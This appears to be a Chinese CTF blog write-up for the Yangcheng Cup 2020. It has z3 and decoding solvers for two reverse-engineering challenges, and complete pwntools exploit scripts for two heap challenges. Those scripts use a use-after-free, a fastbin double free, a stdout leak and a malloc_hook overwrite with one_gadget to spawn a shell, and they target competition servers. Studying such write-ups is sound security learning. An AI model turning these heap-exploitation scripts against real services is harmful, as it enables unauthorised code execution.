@@ -1,0 +1,769 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="description" content>
+  <meta name="author" content="chumen77">
+  <meta name="keywords" content>
+  <title>羊城杯2020部分wp ~ Chumen77&#39;s Blog</title>
+
+  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
+<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
+<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Chumen77's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" false
+         style="background: url('/img/default.png')no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              
+                <p class="mt-3">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
+                  星期一, 九月 14日 2020, 8:56 晚上
+                </p>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    2.3k 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      12 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <h1 id="羊城杯2020部分wp"><a href="#羊城杯2020部分wp" class="headerlink" title="羊城杯2020部分wp"></a>羊城杯2020部分wp</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>Python exe的逆向。其中在修复pyc时，个人不是很熟悉，记录一下：</p>
+<p> 在脱去以后，会有主程序，跟一个struct的文件。</p>
+<p>要保证主程序与struct的前面的魔法字节是相同一样的。</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/yFiJmM.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/r9gtZs.png" srcset="/img/loading.gif" alt><br>重点关注前16个字节，保证相同即可。<br>修复好pyc后，就可以进行反编译。<br>剩下的就是逆算法，需要用到z3。</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">#!/usr/bin/env python2.7
+from z3 import *
+&#39;&#39;&#39;
+a1 = Int(&#39;a1&#39;)
+a2 = Int(&#39;a2&#39;)
+a3 = Int(&#39;a3&#39;)
+a4 = Int(&#39;a4&#39;)
+a5 = Int(&#39;a5&#39;)
+a6 = Int(&#39;a6&#39;)
+a7 = Int(&#39;a7&#39;)
+a8 = Int(&#39;a8&#39;)
+a9 = Int(&#39;a9&#39;)
+a10 = Int(&#39;a10&#39;)
+a11 = Int(&#39;a11&#39;)
+a12 = Int(&#39;a12&#39;)
+a13 = Int(&#39;a13&#39;)
+a14 = Int(&#39;a14&#39;)
+s.add(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748)
+s.add(a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258)
+s.add(a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190)
+s.add(a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + a8 * (2 ** 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136)
+s.add(a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915)
+s.add(a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298)
+s.add(a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875)
+s.add(a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784)
+s.add(a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710)
+s.add(a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376)
+s.add(a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065)
+s.add(a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687)
+s.add(a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250)
+s.add(a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)
+
+if s.check() == sat:
+    result = s.model()
+    print result
+&#39;&#39;&#39;
+&#39;&#39;&#39;
+[a2 = 24,
+ a13 = 88,
+ a6 = 43,
+ a9 = 52,
+ a14 = 33,
+ a5 = 104,
+ a12 = 74,
+ a7 = 28,
+ a1 = 119,
+ a10 = 108,
+ a11 = 88,
+ a8 = 91,
+ a4 = 7,
+ a3 = 10]
+&#39;&#39;&#39;
+
+key = [10,24,119,7,104,43,28,91,108,52,88,74,88,33]
+flag = &#39; &#39;
+for i in range(13,0,-1):
+    key[i-1] = key[i] ^ key[i - 1]
+    flag += chr(key[i-1])
+
+flag = flag[::-1]
+flag += chr(33)
+print(flag)</code></pre>
+<p>其中在z3中处理逻辑运算时，是很特殊的，这个需要注意，具体可以看z3的官方文档。<br>可以参考：<br><a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/" target="_blank" rel="noopener">https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/</a></p>
+<p>还有遇到逻辑左移右移：</p>
+<pre><code class="python">1. “&gt;&gt;”
+int x = 16; printf(&quot;%d\n&quot;, x &gt;&gt; 1);
+先将x转成二进制 10000, 不读最后一位， 输出 1000， 即为8;
+右移一位相当于数值除以2
+
+2. “&lt;&lt;”
+int x = 16; printf(&quot;%d\n&quot;, x &lt;&lt; 1);
+先将x转成二进制 10000, 往最后再读取一位(0, 或根据是否已经有移位)， 输出 100000， 即为32;
+左移，若移动位数K等于或大于数据长度N,通常只移动K mod N 位数
+左移一位相当于数值乘以2</code></pre>
+<p>在这里是左移7，也就是乘 2 的7次方。</p>
+<h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>3层加密.</p>
+<ul>
+<li>一个base64</li>
+<li>一个以13字节，分割字符，进行移位</li>
+<li>单字节凯撒加密，但是也加入了对数字的处理</li>
+</ul>
+<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">import base64
+key = &#39;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&#39;
+key = [ord(c) for c in key]
+buf = [0]*52
+for i in range(len(key)):
+    if key[i] &gt; 64 and key[i] &lt;=90:
+        buf[i] = (key[i] - 65 - 3) % 26 + 65
+        continue
+    if key[i] &gt; 96 and key[i] &lt;=122:
+        buf[i] =  (key[i] - 97 - 3) % 26 + 0x61
+        continue
+    if key[i] &gt; 47 and key[i] &lt;=57:
+        buf[i] = (key[i] - 48 - 3) % 10 + 48
+        continue
+    buf[i] = key[i]
+buf = [chr(c) for c in buf]
+key2 = &#39;&#39;
+for i in buf:
+    key2 += i
+
+key2 = key2[13:26] + key2[39:52] + key2[:13] + key2[26:39]
+flag = base64.b64decode(key2)
+print(flag)
+</code></pre>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="sing-in"><a href="#sing-in" class="headerlink" title="sing in"></a>sing in</h3><p>入门堆题，存在uaf，进行<code>fastbin attcak</code>即可。</p>
+<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./pwn&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;183.129.189.60&#39;,10029)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+def add(size,name,mes):
+    sla(&#39;Your choice :&#39;,&#39;1&#39;)
+    sla(&#39;size&#39;,str(size))
+    sa(&#39;name&#39;,str(name))
+    sla(&#39;mes&#39;,str(mes))
+def show():
+    sla(&#39;Your choice :&#39;,&#39;2&#39;)
+def free(idx):
+    sla(&#39;Your choice :&#39;,&#39;3&#39;)
+    sla(&#39;index:&#39;,str(idx))
+payload = &#39;a&#39; * 0x60
+mes = &#39;b&#39; * 23
+add(0x100,payload,mes)
+add(0x60,payload,mes)
+free(0)
+add(0x60,&#39; &#39;,mes)
+show()
+ru(&quot;Game[2]&#39;s name :&quot;)
+libc_base = uu64(r(6)) - 0x3c4b20
+info_addr(&#39;libc_base&#39;,libc_base)
+
+free(2)
+free(1)
+free(2)
+
+malloc_hook = libc_base + 0x3c4aed
+add(0x60,p64(malloc_hook),p64(malloc_hook))
+add(0x60,p64(malloc_hook),p64(malloc_hook))
+add(0x60,p64(malloc_hook),p64(malloc_hook))
+one = 0x4527a + libc_base
+payload = &#39;1&#39; * 11 + p64(0) + p64(one)
+add(0x60,payload,payload)
+itr()</code></pre>
+<p>其中可以申请一个堆，进行getshell，也可以同时2次free同一个chunk，触发报错函数，而调用报错函数的时候又会用到<code>malloc_hook</code>，从而getshell。</p>
+<h3 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h3><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><ul>
+<li>只有add和del功能</li>
+<li>存在uaf</li>
+<li>只能申请&lt;0x70的堆块</li>
+</ul>
+<h4 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h4><p>需要利用scanf函数来触发<code>malloc_consolidate</code>，使<strong>相邻fastbin堆块</strong>进行合并，并放入unsortedbin的 队列。</p>
+<p>参考链接：</p>
+<p><a href="https://www.anquanke.com/post/id/176139" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176139</a></p>
+<p><a href="https://blog.csdn.net/plus_re/article/details/79265805" target="_blank" rel="noopener">https://blog.csdn.net/plus_re/article/details/79265805</a></p>
+<p><code>malloc_consolidate</code>具体步骤如下：</p>
+<ol>
+<li>判断fastbin是否初始化，如果未初始化，则进行初始化然后退出。</li>
+<li>按照fastbin由小到大的顺序（0x20 ,0x30 ,0x40这个顺序）合并chunk，每种相同大小的fastbin中chunk的处理顺序是从fastbin-&gt;fd开始取，下一个处理的是p-&gt;fd，依次类推。</li>
+<li>首先尝试合并<code>pre_chunk</code>。</li>
+<li>然后尝试合并<code>next_chunk</code>：如果<code>next_chunk</code>是<code>top_chunk</code>，则直接合并到<code>top_chunk</code>，然后进行第六步；如果<code>next_chunk</code>不是<code>top_chunk</code>，尝试合并。</li>
+<li>将处理完的chunk插入到unsorted bin头部。</li>
+<li>获取下一个空闲的fastbin，回到第二步，直到清空所有fastbin中的chunk，然后退出。</li>
+</ol>
+<h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ul>
+<li>利用scanf函数来触发<code>malloc_consolidate</code>，使<strong>相邻fastbin堆块</strong>进行合并，并放入unsortedbin的 队列，在堆上留下libc的相关地址</li>
+<li>利用fastbin attack ，打<code>__IO_2_1_stdout</code>，泄漏libc</li>
+<li>利用fastbin attack ，打<code>malloc_hook</code></li>
+</ul>
+<p>难点在申请堆块的数量,题目限制了19个，是刚刚够用。</p>
+<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./pwn&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 1
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,27411)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def add(size,name,mes):
+    sla(&#39;Your choice :&#39;,&#39;1&#39;)
+    sla(&#39;size&#39;,str(size))
+    sa(&quot;game&#39;s name:&quot;,str(name))
+    sla(&#39;mes&#39;,str(mes))
+
+
+def free(idx):
+    sla(&#39;Your choice :&#39;,&#39;2&#39;)
+    sla(&#39;index:&#39;,str(idx))
+
+def leak_addr():
+    payload = &#39;a&#39; * 0x28
+    mes = &#39;2&#39; * 23
+    add(0x28,payload,mes) #0
+    add(0x28,payload,mes) #1
+    add(0x28,payload,mes) #2
+    free(0)
+    free(1)
+    free(2)
+    add(0x68,payload,mes) #3
+    add(0x68,payload,mes) #4
+    add(0x68,payload,mes) #5
+    add(0x68,payload,mes) #6
+    free(3)
+    free(4)
+    free(5)
+    # debug()
+    sla(&#39;Your choice :&#39;,&#39;2&#39;)
+    sl(&#39;1&#39;*0x500)
+    free(0)
+    free(1)
+    free(2)
+    add(0x68,p16(0xb5dd),&#39;1&#39;) #7
+    add(0x68,p16(0xb5dd),&#39;1&#39;) #8
+    free(6)
+    free(7)
+    free(6)
+    add(0x68,p8(0x90),&#39;1&#39;) #9
+    add(0x68,&#39;1&#39;,&#39;1&#39;) #10
+    add(0x68,&#39;1&#39;,&#39;1&#39;) #11
+    add(0x68,&#39;1&#39;,&#39;1&#39;) #12
+    payload = &#39;b&#39; * 0x33 + p64(0xfbad3c80) + p64(0) * 3 + p8(0)
+    sla(&#39;Your choice :&#39;,&#39;1&#39;)
+    sla(&#39;size&#39;,&#39;104&#39;) #13
+    sa(&#39;name&#39;,payload)
+
+leak = 0
+while True:
+    try:
+        leak_addr()
+        ss = io.recvuntil(chr(0x7f),timeout = 0.5)
+        if len(ss) == 0:
+            raise Exception(&#39;&#39;)
+        io.recv(10)
+        leak = uu64(r(6))
+        if leak == 0x7ff81b57b6a3:
+            raise Exception(&#39;&#39;)
+        break
+    except Exception:
+        io.close()
+        io = process(&#39;./pwn&#39;)
+        # io = remote(&#39;39.101.184.181&#39;,10000)
+        continue
+
+info_addr(&#39;leak&#39;,leak)
+libc_addr = leak - 0x3c56a3
+info_addr(&#39;libc_base&#39;,libc_addr)
+ru(&#39;age&#39;)
+sl(&#39;1&#39;)
+free(10)
+free(11)
+free(10)
+
+malloc_hook = 0x3c4aed + libc_addr
+add(0x68,p64(malloc_hook),&#39;1&#39;)
+add(0x68,&#39;1&#39;,&#39;1&#39;)
+add(0x68,&#39;1&#39;,&#39;1&#39;)
+one_rec = 0xf0364 + libc_addr
+payload = &#39;1&#39; * (0x13-8) + p64(0)+ p64(one_rec)
+add(0x68,payload,&#39;1&#39;)
+free(6)
+free(6)
+
+
+itr()</code></pre>
+
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+            
+              <span>
+                <i class="iconfont icon-tag"></i>
+                
+                  <a class="hover-with-bg" href="/tags/pwn">pwn</a>
+                
+                  <a class="hover-with-bg" href="/tags/re">re</a>
+                
+              </span>
+            
+            </p>
+            
+              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+
+    
+  
+    <!-- 不蒜子统计PV -->
+    
+    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
+          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
+  
+  
+    <!-- 不蒜子统计UV -->
+    
+    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
+            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
+  
+  <br>
+
+
+
+    
+
+
+    <!-- cnzz Analytics icon -->
+    
+
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="/lib/jquery/jquery.min.js" ></script>
+<script src="/lib/popper/popper.min.js" ></script>
+<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
+<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
+<script src="/js/main.js" ></script>
+
+
+  <script src="/js/lazyload.js" ></script>
+
+
+
+  
+    <script src="/lib/tocbot/tocbot.min.js" ></script>
+  
+  <script src="/js/post.js" ></script>
+
+
+
+  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+<!-- Plugins -->
+
+
+  
+
+  
+
+  
+
+  
+
+  <!-- cnzz Analytics -->
+  
+
+
+
+  <script src="/lib/prettify/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="/lib/typed/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "羊城杯2020部分wp&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="/lib/anchor/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+  
+    <script type="text/javascript">
+      //定义获取词语下标
+      var a_idx = 0;
+      jQuery(document).ready(function ($) {
+        //点击body时触发事件
+        $("body").click(function (e) {
+          //需要显示的词语
+          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
+          //设置词语给span标签
+          var $i = $("<span/>").text(a[a_idx]);
+          //下标等于原来下标+1  余 词语总数
+          a_idx = (a_idx + 1) % a.length;
+          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
+          //获取x和y的指针坐标
+          var x = e.pageX, y = e.pageY;
+          //在鼠标的指针的位置给$i定义的span标签添加css样式
+          $i.css({
+            "z-index": 999,
+            "top": y - 20,
+            "left": x,
+            "position": "absolute",
+            "font-weight": "bold",
+            "color": rand_color()
+          });
+          // 随机颜色
+          function rand_color() {
+            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+          }
+          //在body添加这个标签
+          $("body").append($i);
+          //animate() 方法执行 CSS 属性集的自定义动画。
+          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
+          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
+          $i.animate({
+            //将原来的位置向上移动180
+            "top": y - 180,
+            "opacity": 0
+            //1500动画的速度
+          }, 1500, function () {
+            //时间到了自动删除
+            $i.remove();
+          });
+        });
+      })
+      ;
+    </script>
+  
+
+
+
+
+
+
+
+
+</body>
+</html>
